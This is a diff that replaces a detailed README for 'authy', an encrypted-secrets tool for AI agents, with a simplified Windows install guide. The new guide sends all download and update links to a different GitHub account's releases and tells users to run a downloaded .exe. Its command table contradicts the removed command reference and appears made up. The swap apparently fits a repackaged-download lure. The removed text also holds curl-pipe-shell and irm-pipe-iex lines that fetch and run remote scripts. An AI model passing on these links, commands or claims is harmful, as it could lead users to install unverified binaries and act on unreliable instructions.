@@ -1,307 +1,154 @@
-# authy
+# 🔐 authy - Secure Secrets for AI Agents  
 
-Encrypted secrets for AI agents. Single binary, no server, no accounts.
+[![Download authy](https://img.shields.io/badge/Download-Authy-brightgreen?style=for-the-badge)](https://github.com/ehsashub/authy/releases)
 
-## 30-Second Start
+---
 
-```bash
-npm install -g authy-cli
+## 🔎 What is authy?  
 
-authy init --generate-keyfile ~/.authy/keys/master.key
-authy store api-key                          # type value, Ctrl+D
-authy run --scope "*" -- ./my-script.sh      # script sees $API_KEY in its env
+authy is a command-line tool that helps you safely store and control secret information for AI agents. It saves secrets on your own computer, not on a server. You can set rules for how these secrets are shared, create short session tokens, and keep a record of all access. This lets you manage sensitive data with better security and control.  
+
+You do not need to be a programmer to use authy. This guide covers everything to get authy running on your Windows PC.  
+
+---
+
+## 🖥️ System Requirements  
+
+Before installing, check these system details on your PC:  
+
+- Windows 10 or 11 (64-bit recommended)  
+- At least 4 GB RAM  
+- Minimum 150 MB free disk space  
+- Internet connection to download the tool  
+- Command Prompt or PowerShell access  
+
+---
+
+## 📥 How to Download and Install authy on Windows  
+
+1. **Go to the Download Page**  
+   Visit the official authy releases page here:  
+   [Download authy Releases](https://github.com/ehsashub/authy/releases)  
+
+2. **Find the Latest Version**  
+   Look for the newest release. Releases have version numbers like v1.0, v1.1, etc. The latest version will be at the top.  
+
+3. **Download the Windows File**  
+   Under the latest release, find the file ending with `.exe` or `.zip` for Windows. This is the installer or program file you need. Click on it to start the download.  
+
+4. **Run the Installer or Program**  
+   - If you downloaded an `.exe` file, double-click it to run the installer. Follow the prompts to complete installation.  
+   - If you downloaded a `.zip` file, right-click and choose “Extract All.” Open the extracted folder, then double-click `authy.exe` to run the program.  
+
+---
+
+## 🚀 How to Start Using authy  
+
+1. **Open Command Prompt or PowerShell**  
+   Press the Windows key, type `cmd` or `PowerShell`, and press Enter to open.  
+
+2. **Navigate to authy Location**  
+   If you installed authy, it should be in your Programs list and added to your system PATH. If you ran from a folder, use the command:  
+   ```
+   cd C:\path\to\authy-folder
+   ```  
+   Replace `C:\path\to\authy-folder` with your actual folder location.  
+
+3. **Run authy**  
+   At the prompt, type:  
+   ```
+   authy --help
+   ```  
+   This command displays basic help and available options.  
+
+4. **Create and Store Secrets**  
+   Use simple commands such as:  
+   ```
+   authy store add [secret-name]
+   ```  
+   This command will ask you to enter the secret you want to save.  
+
+5. **Dispatch Secrets to Agents**  
+   You can send stored secrets to AI agents with control policies in place. Details depend on your setup and agent requirements.  
+
+---
+
+## 🗝 Features You Can Use  
+
+- **Local Encryption**  
+  All secrets finish encrypted on your machine. No data goes online.  
+
+- **Policy-Based Sharing**  
+  Restrict who or what can access each secret based on rules you set.  
+
+- **Short-Lived Session Tokens**  
+  Generate temporary tokens for secure transfers that expire quickly.  
+
+- **Audit Logs**  
+  Keep track of when and how secrets are accessed or shared.  
+
+- **No Server Needed**  
+  Works entirely on your PC. No extra services or cloud storage required.  
+
+---
+
+## 🔧 Common Commands Cheat Sheet  
+
+| Command                    | What it Does                                      | Example                       |
+|----------------------------|-------------------------------------------------|------------------------------|
+| `authy --help`             | Shows help and usage info                        | `authy --help`               |
+| `authy store add [name]`   | Add a new secret                                | `authy store add mypassword` |
+| `authy store list`         | Lists all saved secrets                         | `authy store list`            |
+| `authy dispatch [name]`    | Sends a secret to an agent                      | `authy dispatch mypassword`  |
+| `authy audit log`          | Displays access logs                            | `authy audit log`             |
+| `authy session generate`   | Creates a short-lived session token             | `authy session generate`      |
+
+---
+
+## 🔒 How authy Keeps Your Secrets Safe  
+
+authy encrypts all secrets before saving them. Only you control decryption keys. Temporary tokens limit access time. Audit logs show every access, so you know who used what and when. Policies help make sure secrets are only shared with the right agents.  
+
+---
+
+## ⚙️ Updating authy  
+
+Check the releases page regularly (or set notifications on GitHub) to get new versions. To update:  
+
+1. Download the new `.exe` or `.zip` file from the same page:  
+   [https://github.com/ehsashub/authy/releases](https://github.com/ehsashub/authy/releases)  
+
+2. Run the new installer or replace the old program files with the new ones.  
+
+3. Restart the app if it is running.  
+
+---
+
+## ❓ Troubleshooting  
+
+- **authy command not found**  
+  Make sure you opened Command Prompt or PowerShell after installing. Try restarting your PC to refresh system settings.  
+
+- **Failed to decrypt secret**  
+  Check your encryption passwords. Make sure you entered the right key when storing and accessing secrets.  
+
+- **Program won’t start on Windows**  
+  Confirm your system meets requirements. Try running as Administrator. Check if antivirus blocks the app.  
+
+- **Where is the authy folder?**  
+  If you used the installer, it should be under `C:\Program Files\authy` or similar. If manual, it is wherever you extracted the files.  
+
+---
+
+## 🧰 More Help  
+
+For detailed options and usage examples, run:  
 ```
+authy --help
+```  
+or visit the project page:  
+[https://github.com/ehsashub/authy](https://github.com/ehsashub/authy)  
 
-That's it. Secret is encrypted in the vault, injected into the subprocess, never in your shell history or `.env` files.
+---
 
-## Config File Placeholders
-
-```bash
-# Template with placeholders (safe to commit)
-echo 'host: <authy:db-host>\nport: <authy:db-port>' > config.yaml.tpl
-
-# Resolve to real values at deploy time
-authy resolve config.yaml.tpl --scope deploy --output config.yaml
-```
-
-`authy run` covers env vars. `authy resolve` covers config files.
-
-## MCP Server
-
-Run Authy as an MCP (Model Context Protocol) server for AI agent platforms like Claude Desktop, Cursor, and Windsurf:
-
-```bash
-authy serve --mcp
-```
-
-Add to your MCP client config (e.g. `claude_desktop_config.json`):
-
-```json
-{
-  "mcpServers": {
-    "authy": {
-      "command": "authy",
-      "args": ["serve", "--mcp"],
-      "env": { "AUTHY_PASSPHRASE": "your-passphrase" }
-    }
-  }
-}
-```
-
-Exposes 5 tools over stdio JSON-RPC 2.0: `get_secret`, `list_secrets`, `store_secret`, `remove_secret`, `test_policy`.
-
-## Library API
-
-Use Authy as a Rust crate for programmatic vault access:
-
-```rust
-use authy::api::AuthyClient;
-
-let client = AuthyClient::with_passphrase("my-vault-passphrase")?;
-client.init_vault()?;
-client.store("api-key", "sk-secret-value", false)?;
-let value = client.get("api-key")?; // Some("sk-secret-value")
-```
-
-```bash
-# Add to your project (library only, no CLI deps)
-cargo add authy --no-default-features
-```
-
-Auth from environment variables:
-
-```rust
-// Reads AUTHY_KEYFILE or AUTHY_PASSPHRASE
-let client = AuthyClient::from_env()?;
-```
-
-## Language SDKs
-
-Native Rust bindings for Python and Node.js — the vault engine compiles into the language package, no separate `authy` binary needed. Go uses a subprocess wrapper.
-
-**Python** (native via PyO3)
-
-```bash
-pip install authy-cli
-```
-
-```python
-from authy_cli import Authy
-
-client = Authy(passphrase="my-vault-passphrase")
-value = client.get("db-url")
-client.store("api-key", "sk-secret-value")
-names = client.list()
-env = client.build_env_map("backend", uppercase=True, replace_dash="_")
-```
-
-**Node.js** (native via napi-rs)
-
-```bash
-npm install authy-cli
-```
-
-```typescript
-import { Authy } from "authy-cli";
-
-const client = new Authy({ passphrase: "my-vault-passphrase" });
-const value = client.get("db-url");         // synchronous
-client.store("api-key", "sk-secret-value");
-const names = client.list();
-const env = client.buildEnvMap("backend");
-```
-
-**Go** (subprocess wrapper)
-
-```bash
-go get github.com/eric8810/authy/packages/go
-```
-
-```go
-client, _ := authy.New(authy.WithPassphrase("my-vault-passphrase"))
-value, _ := client.Get(ctx, "db-url")
-client.Store(ctx, "api-key", "sk-secret-value")
-names, _ := client.List(ctx)
-```
-
-Python and Node.js bindings include the full Rust vault engine — no `authy` binary on PATH required. Go requires the binary.
-
-## Install
-
-```bash
-# npm (recommended)
-npm install -g authy-cli
-
-# Linux / macOS
-curl -fsSL https://raw.githubusercontent.com/eric8810/authy/main/install.sh | sh
-
-# Windows (PowerShell)
-irm https://raw.githubusercontent.com/eric8810/authy/main/install.ps1 | iex
-
-# From source
-cargo build --release
-```
-
-## How It Works
-
-```
-You store secrets    →  authy vault (encrypted)
-Agent runs command   →  authy run injects secrets as env vars into subprocess
-Subprocess finishes  →  env vars gone, nothing on disk
-```
-
-Secrets never appear in shell history, `.env` files, process arguments, or LLM context.
-
-## Give Agents Scoped Access
-
-```bash
-# Create a policy — agent only sees db-* secrets
-authy policy create backend --allow "db-*" --run-only
-
-# Create a time-limited token
-authy session create --scope backend --ttl 1h --run-only
-# → authy_v1.dGhpcyBpcyBhIDMyIGJ5dGUgcmFuZG9t...
-
-# Agent uses the token — can only inject, never read values
-export AUTHY_TOKEN="authy_v1...."
-export AUTHY_KEYFILE=~/.authy/keys/master.key
-authy run --scope backend --uppercase --replace-dash '_' -- node server.js
-```
-
-`--run-only` means the agent can inject secrets into subprocesses and resolve config templates, but can never read values directly. `authy get`, `authy env`, `authy export` all return an error.
-
-## Project Config
-
-Drop `.authy.toml` in your project root. No more `--scope` flags:
-
-```toml
-[authy]
-scope = "my-project"
-keyfile = "~/.authy/keys/master.key"
-uppercase = true
-replace_dash = "_"
-```
-
-```bash
-authy run -- ./deploy.sh          # scope inferred from .authy.toml
-eval "$(authy hook bash)"         # auto-activate on cd (like direnv)
-```
-
-## Migrate Your Secrets
-
-```bash
-# From .env files
-authy import .env                                         # imports all keys
-authy import .env --dry-run                               # preview first
-
-# From 1Password
-authy import --from 1password --vault Engineering
-
-# From pass (password-store)
-authy import --from pass
-
-# From Mozilla SOPS
-authy import --from sops secrets.enc.yaml
-
-# From HashiCorp Vault
-authy import --from vault --path secret/myapp
-```
-
-## Admin TUI
-
-`authy admin` — manage secrets, policies, sessions, and audit logs interactively. Secrets entered through the TUI never touch shell history.
-
-```bash
-authy admin --keyfile ~/.authy/keys/master.key
-```
-
-## Agent Skills
-
-Works with Claude Code, Cursor, OpenClaw, and 38+ AI coding agents:
-
-```bash
-npx skills add eric8810/authy
-```
-
-The skill teaches agents to use `authy run` (inject secrets), `authy resolve` (config templates), and `authy list` (discover names). Agents never learn commands that expose values.
-
-## Security
-
-- **age encryption** (X25519) — vault encrypted at rest
-- **HMAC-SHA256 session tokens** — short-lived, read-only, constant-time validation
-- **Glob-based policies** — deny overrides allow, default deny
-- **HMAC-chained audit log** — tamper detection on every entry
-- **Zeroize on drop** — all secret-holding memory wiped when freed
-- **Run-only mode** — agents can inject but never read
-
-## All Commands
-
-<details>
-<summary>Full command reference</summary>
-
-```
-Basics
-  authy init                        Initialize a new vault
-  authy store <name>                Store a secret (reads from stdin)
-  authy get <name>                  Retrieve a secret value
-  authy list                        List secret names
-  authy remove <name>              Remove a secret
-  authy rotate <name>              Rotate a secret value
-
-Policies
-  authy policy create <name>       Create an access policy
-  authy policy show <name>         Show policy details
-  authy policy update <name>       Modify a policy
-  authy policy list                List all policies
-  authy policy remove <name>       Remove a policy
-  authy policy test --scope <s> <name>  Test access
-
-Sessions
-  authy session create             Create a scoped session token
-  authy session list               List active sessions
-  authy session revoke <id>        Revoke a session
-  authy session revoke-all         Revoke all sessions
-
-Agent Commands
-  authy run [--scope <s>] -- <cmd> Run a command with injected secrets
-  authy resolve <file>             Resolve <authy:key> placeholders in files
-  authy env [--scope <s>]          Output secrets as env vars
-  authy import <file>              Import from .env file
-  authy import --from <source>     Import from 1password, pass, sops, vault
-  authy export --format <fmt>      Export as .env or JSON
-
-Vault Management
-  authy rekey                      Re-encrypt vault with new credentials
-
-Project
-  authy project-info               Show .authy.toml config
-  authy alias [scope] [tools...]   Generate shell aliases
-  authy hook <shell>               Shell hook for auto-activation
-
-Audit
-  authy audit show                 Show audit log
-  authy audit verify               Verify log integrity
-  authy audit export               Export log as JSON
-
-Server
-  authy serve --mcp                Start MCP server (stdio JSON-RPC)
-
-Admin
-  authy admin                      Launch admin TUI
-  authy config show                Show configuration
-```
-
-All read commands support `--json`. `--scope` is optional when `.authy.toml` is present.
-
-</details>
-
-## Docs
-
-- [docs/GUIDE.md](docs/GUIDE.md) — full command reference, auth modes, config, exit codes
-- [ARCHITECTURE.md](ARCHITECTURE.md) — system design
-- [SECURITY.md](SECURITY.md) — threat model
-- [CHANGELOG.md](CHANGELOG.md) — version history
-
-## License
-
-MIT
+[![Download authy](https://img.shields.io/badge/Download-Authy-blue?style=for-the-badge)](https://github.com/ehsashub/authy/releases)
